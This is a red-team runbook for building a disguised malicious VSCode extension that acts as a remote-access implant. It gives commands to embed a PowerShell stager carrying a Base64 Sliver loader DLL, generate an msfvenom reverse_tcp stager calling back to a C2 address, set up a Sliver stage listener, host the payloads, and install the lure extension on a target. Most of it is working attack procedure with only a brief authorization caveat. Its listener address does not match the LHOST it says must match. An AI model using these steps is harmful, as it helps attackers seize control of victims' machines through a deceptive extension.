# VSCode Malicious Extension – Red Team Implant Documentation

## Overview
This technique deploys a malicious VSCode extension (.vsix) to execute a staged payload via PowerShell,
using Sliver C2 for command and control. Intended for authorized red team engagements only.

---

## Prerequisites

Install required Node.js tooling:

```bash
npm install -g yo generator-code @vscode/vsce
```

---

## 1. Scaffold the VSCode Extension

```bash
yo code
```

When prompted:
- **Extension type:** TypeScript (recommended)
- **Name:** Choose a convincing lure name
- **Identifier:** Match the name

---

## 2. Edit the Extension Logic

Open `src/extension.ts` and update the embedded PowerShell command to reference:
- Your `.ps1` filename
- Your C2 listener IP address

---

## 3. Compile the Extension Locally

```bash
npm install
npm run compile
```

---

## 4. Package to VSIX

```bash
vsce package
# Output: <ExtensionName>.vsix
```

---

## 5. Build the .NET Loader (Sliver DLL)

1. Open the `.NET` loader project in Visual Studio.
2. Confirm the **remote bin path** and **C2 IP** are correct in the loader config.
3. Compile the project — output is `sliverloader.dll`.

Convert the DLL to a Base64 string for embedding in the PowerShell stager:

```powershell
Get-Content -Encoding Byte -Path .\sliverloader.dll | clip
```

4. Paste the copied bytes into **CyberChef** with the following recipe:
   - `From Decimal` (Line feed delimiter)
   - `To Base64`
5. Copy the Base64 output and paste it into your `.ps1` stager script.

---

## 6. Generate the Sliver Stager Binary

Use `msfvenom` to generate a raw stager that connects back to Sliver's stage listener:

```bash
msfvenom --payload windows/x64/custom/reverse_tcp \
  LHOST=192.168.1.126 \
  LPORT=1234 \
  LURI=/hello.woff \
  --format raw \
  --out stager.bin
```

---

## 7. Configure Sliver C2

Create a new Sliver profile and start the stage listener:

```bash
profiles new --mtls 192.168.1.126 --format shellcode local

stage-listener --url tcp://192.168.122.1:1234 --profile local --prepend-size
```

> **Note:** Ensure the LHOST/LPORT in `msfvenom` matches the `stage-listener` address.

---

## 8. Host the Payload Files

Serve the following files from a Python HTTP server (or equivalent):
- `stager.bin`
- `<stager>.ps1`

Confirm all callback addresses in the `.ps1` script point to the correct C2 listener.

```bash
python3 -m http.server 8080
```

---

## 9. Deploy the Extension to the Target

Transfer the `.vsix` file to the target host and install it manually via VSCode:

```
Extensions panel → ··· menu → Install from VSIX...
```

Or via CLI:

```bash
code --install-extension <ExtensionName>.vsix
```

---

## Notes & Checklist

- [ ] C2 IP is consistent across: loader, `.ps1`, `msfvenom`, and `stage-listener`
- [ ] DLL Base64 blob is correctly embedded in `.ps1`
- [ ] Python server is running and reachable from target
- [ ] Sliver stage listener is active before extension executes
- [ ] VSIX installed on target machine